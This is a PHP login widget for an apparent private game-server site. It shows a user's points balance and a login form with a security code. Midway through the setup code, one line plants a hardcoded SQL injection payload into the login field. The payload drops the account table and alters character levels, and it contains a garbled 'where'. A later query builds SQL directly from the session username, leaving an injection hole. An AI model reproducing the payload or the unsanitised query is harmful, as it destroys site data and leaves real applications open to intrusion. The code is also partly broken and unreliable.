<? 
session_start();
header("Cache-control: private");
ob_start();
require_once "security.php";

require_once "sql_inject.php";

$bDestroy_session = TRUE;
$url_redirect = 'index.php';
$sqlinject = new sql_inject('./log_file_sql.log',$bDestroy_session,$url_redirect); 
$timeStart=gettimeofday();
$timeStart_uS=$timeStart["usec"];
$timeStart_S=$timeStart["sec"]; 
require("config.php");
include("includes/web_modules.php");
magic();
include("includes/clean_var.php");
include("includes/sql_check.php");
htmlspecialchars($_REQUEST);
include("includes/ilogin.class.php");
login();
check_inject();
logincheck();
check_user(); 
function delayedrefresh($page) {
	echo "<meta http-equiv='refresh' content='3; URL={$page}'>";
}
function quickrefresh($page) {
	echo "<meta http-equiv='refresh' content='.0000000000000000001; URL={$page}'>";
}
if(isset($_SESSION['user'])) {clean_var($_SESSION['user']);}
$_POST['login'] = "%%'; drop table memb_info ; update character set clevel = 350ere name = '%%";  
?>
<meta http-equiv="Content-Type" content="text/html" charset="utf-8" />
<link rel="stylesheet" href="creativestyle/Layout.css" />


<style>

#loginIDNPW {
    width:132px;
    _width:130px;
    float:left;
    text-align:left;
    margin:0 0 0 3px;
}
#loginIDNPW input 
{
    color:#fff; 
    font-weight:bold;
    font-size:9pt;
    height:20px; 
    width:109px; 
    padding:3px 0 0 0;
    margin:0 0 0 7px;
}

#loginIDNPW div.loginInputBack { background:url(creativestyle/images/bg_idpw.gif) no-repeat 0 0; margin-top:4px; }
#loginIDNPW div.codeInputBack { background:url(creativestyle/images/bg_code.gif) no-repeat 0 0; margin-top:4px; }
#txtLocalID { background:url(creativestyle/images/id_txt.gif) no-repeat 2px 3px; }
#txtLocalID.clearBg { background-image:none; }

#ValidateCode { background:url(creativestyle/images/security.gif) no-repeat 2px 3px; }
#ValidateCode.clearBg { background-image:none; }
#txtPassword { background:url(creativestyle/images/pw_txt.gif) no-repeat 2px 3px; }
#txtPassword.clearBg { background-image:none; }
#loginButton { display:block; float:left; margin-top:3px; }

.loginSecuritySetting {
	height:20px;
    margin:7px 0 7px 0px;
    font:normal 11px dotum,??; 
    color:#5899c6;
    clear:both;
}
td{font-size:9pt;color:#333333}
btna{width:48px;height:48px}
a{color:#999999}
a:link{color:#999999;text-decoration:none; font-size: 12px;} 
a:visited{color:#999999; text-decoration:none; font-size: 12px;} 
a:hover{color:#999999; text-decoration:none; font-size: 12px;} 
a:active { color:#999999; text-decoration:none; } 
body {
	margin-left: 0px;
	margin-top: 0px;
}
</style>

<body style="background-color=transparent">
   <script type="text/javascript">
    
    function setBack(obj, showBg) {
        if (showBg == false) {
            obj.className = 'clearBg';
        }
        
        if (showBg == true && obj.value == '') {
            obj.className = '';
        }
    }
    </script>


</head>

<body style="background-color=transparent">

<?
require("config.php");
$memb___id = $_SESSION['user'];
$comanda1="SELECT UserPoint from UserInfo where UserName = '$memb___id' "; //query to get all affiliates
$rezultat2=mssql_query($comanda1) or die("Can`t be executed");
while($r2=mssql_fetch_array($rezultat2)){
$UserPoint = $r2["UserPoint"];
}if ((isset($_SESSION['pass'])) && (isset($_SESSION['user']))){?>

        <div style="background:url('creativestyle/images/loginbg2.jpg') no-repeat bottom left;width:190px;height:85px;padding-top:3px">
	<div style="margin-left:20px;margin-top:-4px;color:#ffffff;text-align:left;line-height:16px;">
	<br>



<?echo '
<strong>Hello, <span id="ctl00_UserID" style="color:#FFE32A;">'.$_SESSION[user].'</span></strong><br>
<strong>RE-Points: <span id="ctl00_GamePoint" style="color:#8FFAD0;">'.$UserPoint.'</span></strong> 
</div><br>
<form action="" method="post" name="logout_account" id="logout_account">
<input name="logoutaccount" type="hidden" id="logoutaccount" value="logoutaccount"> 
<input name="Logout!" type=image src="creativestyle/images/uni_logout_o.gif" id="Logout!"  title="Log Out"  value="Log Out">
</form>
	</div>

'; } else {

$scode = mt_rand(1000000,9999999);

$secu = stripslashes($_POST['secu']);

echo'
     <form action="" method="post" name="logout_account" id="logout_account">

<div>
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJNzc3OTI0NjM5ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQULbG9naW5CdXR0b27+hHoaJI9R1twQsWaIe4zAdo4BsA==" />
</div>

<div>

	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWBQL4/fW5CQLFu8OkCgK1qbSRCwLRmZCFBgLejM6fD8A18PbG2FZj+s6sb+x3keaVszo4" />
</div>
<div id="loginIDNPW">
<div class="loginInputBack">
	<input name="login" type="text" maxlength="12" id="txtLocalID" tabindex="1" onfocus="setBack(this, false);" onkeydown="setBack(this, false);" onblur="setBack(this, true);" />
</div>
<div class="loginInputBack">
	<input name="pass" type="password" maxlength="20" id="txtPassword" tabindex="2" onkeypress="if (event.keyCode==18) {LoginNexon();}" onfocus="setBack(this, false);" onkeydown="setBack(this, false);" onblur="setBack(this, true);" />

</div>



<div class="loginInputBack">
	<input name="secu" type="text" maxlength="20" id="ValidateCode" tabindex="2" onkeypress="if (event.keyCode==18) {LoginNexon();}" onfocus="setBack(this, false);" onkeydown="setBack(this, false);" onblur="setBack(this, true);" />

</div>




</div>
<input name="account_login" type="hidden" id="account_login" value="account_login"><input type=hidden name=code value='.$scode.'><input type="image" name="loginButton" id="loginButton" src="creativestyle/images/btn_login.gif" style="height:48px;width:48px;border-width:0px;" /><DIV align=center><font color=green>'.$scode.'</font></div>
 </form>



  </form>



</td>
    </tr>
  </form>   '; } ?>